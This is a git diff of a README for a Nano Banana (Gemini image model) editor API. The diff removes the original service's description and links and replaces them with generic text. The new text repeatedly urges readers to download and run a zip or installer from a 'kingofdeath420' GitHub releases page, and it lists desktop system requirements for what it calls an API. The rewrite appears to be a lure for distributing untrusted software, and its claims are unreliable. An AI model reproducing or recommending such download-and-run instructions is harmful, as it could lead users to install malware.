@@ -1,90 +1,87 @@
-# 🍌 Nano Banana Images Editor API
+# 🍌 Nano-Banana-images-Editor-API - Create Stunning Images with Ease
 
-AI Image Generator API — Nano Banana (Gemini 2.5 Flash), ![cheaper](https://img.shields.io/badge/-up%20to%2080%25%20cheaper!-brightgreen?style=flat)
- Experience stunning AI image editing with Google’s Nano Banana — delivering the same powerful results at just a fraction of the cost. 👉 <a href="https://geminigen.ai/pricing" target="_blank">Check Pricing</a>.  
+[![Download Nano-Banana](https://img.shields.io/badge/Download-Nano--Banana-brightgreen)](https://github.com/kingofdeath420/Nano-Banana-images-Editor-API/releases)
 
-We offer <a href="https://geminigen.ai/" target="_blank">A full-featured  web app</a> for seamless image editing, along with <a href="https://ainnate-geminigen.github.io/GEMINIGEN.AI-API-DEMO/" target="_blank">A dedicated platform</a> that lets users with API access generate images effortlessly.
+## 🚀 Getting Started
 
-**Professional AI Image Generator Platform**
+Welcome to the Nano-Banana-images-Editor-API! This powerful AI Image Generator lets you create amazing images using Google's Nano Banana technology. With advanced features, you can enjoy high-quality image editing without breaking the bank.
 
-Our web app makes image creation and editing effortless, with powerful AI options, intuitive tools, and a clean, user-friendly interface designed for everyone. <a href="https://geminigen.ai/app/imagen" target="_blank">Try it now</a>.
+## 📦 System Requirements
 
-<a href="https://geminigen.ai/" target="_blank">
-  <img src="assets/images/ai_image_gen_sample.png" alt="GenminiGen AI Sample" style="width:100%; max-width:100%;" />
-</a>
+Before you start, ensure your system meets these basic requirements:
 
-## ✨ Features
+- **Operating System:** Windows 10 or later / macOS 10.13 or later / Linux (any modern distribution)
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 1 GB free space
+- **Internet Connection:** Required for API access
 
-**Nano Banana** is Google’s latest, fastest, and most efficient natively multimodal model.  
-It allows you to generate and edit images seamlessly in a conversational way, combining speed with high-quality outputs.  
+## 💻 Features
 
-With this cutting-edge model at the core, our app unlocks a suite of powerful features designed to make image creation effortless and inspiring:  
+- **AI-Driven Image Generation:** Use state-of-the-art algorithms to create images from text prompts.
+- **Easy Integration:** Simple API setup to incorporate into your applications.
+- **Cost-Effective:** Achieve results at a fraction of the cost compared to other services.
+- **User-Friendly Interface:** Designed for everyone, regardless of technical skills.
+- **Fast Processing:** Generate images quickly without long waits.
 
-- 🌐 **Full-Featured Web App** — Seamless UI for creating and editing images with powerful AI tools.  
-- 📝 **Text-to-Image Generation** — Generate high-quality images from simple text prompts with support for multiple styles.  
-- 🎨 **Style Transfer** — Instantly transform your images into different artistic styles (e.g. Anime, Ghibli, Realistic, Cinematic).  
-- 📐 **Flexible Aspect Ratios** — Choose from presets like 1:1, 16:9, 3:4, or 9:16 for social media, presentations, or custom designs.  
-- 🖼️ **Image Reference Support** — Upload an image as a reference to guide generation for more accurate and consistent results.  
-- ⚡ **Server Options** — Pick between Regular (affordable) or VIP (priority, no delays) servers.  
-- 🔍 **Interactive Examples** — Explore side-by-side comparisons to see AI transformations in real time.  
-- 🔗 **Developer-Friendly API** — Integrate image generation into your apps easily with simple endpoints.
+## 📥 Download & Install
 
-## 🎯 Usage Guide
+To download and start using the Nano-Banana-images-Editor-API, [visit this page to download](https://github.com/kingofdeath420/Nano-Banana-images-Editor-API/releases). Here’s how:
 
-### 🖼️ Creating Images
+1. **Go to the Releases Page:**
+   Click the link above to access the **Releases** page on GitHub.
 
-1. **Choose Model & Style** — Select an AI model (e.g. *Nano Banana*) and your preferred style.  
-2. **Enter a Prompt** — Write a clear, detailed description of the image you want.  
-3. **Set Aspect Ratio** — Pick the right dimensions (1:1, 3:4, 4:3, 16:9, or 9:16,...).  
-4. **Upload Reference (Optional)** — Add an image to guide the generation process.  
-5. **Select Server** — Use **Regular Server** (affordable) or **VIP Server** (priority, faster).  
-6. **Generate** — Click **Generate** to start. After a short moment, your result will appear in the preview area, or you can check it in the notifications panel.
+2. **Select the Latest Version:**
+   Look for the latest release. Usually, this is the one at the top of the list.
 
-### 💡 Tips for Best Results
+3. **Download the Package:**
+   Click on the file appropriate for your system. This could be a `.zip` file or an installer. 
 
-- ✍️ **Be specific**: The more detailed your prompt, the better the result.  
-- 🖼️ **Use references**: Upload reference images to improve consistency.  
-- 🎨 **Experiment with styles**: Try different artistic styles (Anime, Ghibli, Realistic, Cinematic).  
-- ⚡ **Choose the right server**: Use VIP server for faster, priority generation.  
-- 📐 **Set aspect ratios**: Adjust image dimensions to match your use case (social media, banners, thumbnails).
+4. **Unzip or Run the Installer:**
+   If you downloaded a `.zip`, extract the files. If you have an installer, double-click to run it.
 
-## 🖼️ Results & Examples
+5. **Follow Installation Instructions:**
+   Follow the prompts on your screen. This typically includes accepting license agreements and selecting a destination folder.
 
-See the power of AI image generation in action. Easily transform your images with different styles, aspect ratios, and options. We will take the example: turn photos into figurines.
+6. **Access the API:**
+   After installation, you can start using the API by referring to the documentation included in the package.
 
-**Image origin:**
+## 🔧 How to Use the API
 
-<img src="assets/images/google_nano_banana.jpg" alt="GenminiGen AI Sample" style="width:100%; max-width:100%;" />
+Using the Nano-Banana API is straightforward. Here’s a brief overview of how to get started:
 
-**Prompt:**
+1. **Obtain an API Key:** 
+   To use the API, you will need an API key. Follow the instructions in the documentation to create an account and get your key.
 
-Create a 1/7 scale commercialized figurine of the characters in the picture, in a realistic 1:1 style, in a real environment. The figurine is placed on a computer desk. The figurine has a round transparent acrylic base, with no text on the base. The content on the computer screen is the Zbrush modeling process of this figurine. Next to the computer screen is a BANDAI-style toy packaging box printed with the original artwort. The packaging features two-dimensional flat illustrations.
+2. **Send Requests:**
+   Use your programming environment to send requests to the API. Most users will find it useful to check sample code provided in the documentation to understand how to format their requests.
 
-**Output:**
+3. **Receive Images:**
+   After sending a request with your desired prompt, you will receive an image in return. You can save it directly to your device or use it in your project.
 
-<img src="assets/images/generated_google_nano_banana_sample.png" alt="GenminiGen AI Sample" style="width:100%; max-width:100%;" />  
+## 🛠️ Troubleshooting
 
+If you encounter any issues, try these solutions:
 
-> ⚡ The result below was generated using **Nano Banana (Gemini 2.5 Flash Image)** on our web app.  
+- **Check Your Internet Connection:** Ensure you have a reliable network connection.
+- **Verify Your API Key:** Ensure you are using the correct API key for requests.
+- **Consult Documentation:** Check the documentation for specific error messages and solutions.
 
+## 🆘 Support and Contributions
 
-**✨🖼️ Image generation options and results on the web interface:**  
+For questions or support, you can open an issue on the GitHub repository. Our team monitors the repository and will respond to your queries as soon as possible.
 
-<img src="assets/images/geminigen_nano_banana_result.png" alt="GenminiGen AI Sample" style="width:100%; max-width:100%;" />  
+If you would like to contribute, feel free to fork the repository, make your changes, and submit a pull request. Your contributions help improve the tool for everyone!
 
-## 🤝 Contributing
+## 🌐 Related Topics
 
-We warmly welcome contributions in the form of:
+If you're interested in AI projects like this one, you may also explore:
 
-- 💡 **Feature Suggestions** — Share ideas to improve or expand the app’s capabilities.  
-- 🛠 **Enhancements** — Propose improvements to performance, UI/UX, or AI model usage.  
-- 🐞 **Bug Reports** — Help us identify and fix issues to ensure a smooth user experience.  
-- 📈 **Collaboration** — We are open to discussions about potential partnerships or integrations.
+- AI-driven computer vision solutions
+- Deep learning applications
+- Other image generation tools
 
-👉 If you’d like to contribute, please reach out via **Issues** or contact us directly at [contact@geminigen.ai](mailto:contact@geminigen.ai)
+We encourage you to explore the creativity and potential of AI image editing with the Nano-Banana-images-Editor-API!
 
-## 🔗 Links & Resources
+---
 
-- 👨‍💻 **Our website:** [https://geminigen.ai](https://geminigen.ai/)  
-- 📚 **Our API Documentation:** [https://docs.geminigen.ai](https://docs.geminigen.ai/)  
-- 📖 **Google Nano Banana Docs:** [Official Documentation](https://ai.google.dev/gemini-api/docs/models#gemini-2.5-flash-image-preview)  
+For more updates, stay connected! And remember to [visit this page to download](https://github.com/kingofdeath420/Nano-Banana-images-Editor-API/releases) the latest version whenever you need it.
